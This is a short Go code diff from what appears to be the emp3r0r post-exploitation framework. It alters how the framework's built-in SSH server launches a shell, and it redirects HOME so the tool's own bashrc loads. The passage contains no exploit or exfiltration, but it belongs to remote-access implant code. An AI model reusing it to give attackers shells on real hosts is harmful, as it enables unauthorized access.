@@ -12,6 +12,7 @@ import (
 	"github.com/creack/pty"
 	"github.com/gliderlabs/ssh"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func setWinsize(f *os.File, w, h int) {
@@ -42,8 +43,10 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			if err != nil {
 				log.Printf("sshd: extract built-in bash: %v", err)
 			}
-			cmd = exec.Command(emp3r0r_data.DefaultShell, "--rcfile", RuntimeConfig.UtilsPath+"/.bashrc")
+			cmd = exec.Command(util.FileBaseName(emp3r0r_data.DefaultShell))
 		}
+		bash_home := RuntimeConfig.UtilsPath // change home to use our bashrc
+		os.Setenv("HOME", bash_home)
 		cmd.Env = append(cmd.Env, os.Environ()...)
 		log.Printf("sshd execute: %s %v, env=%s", exe, args, cmd.Env)
 
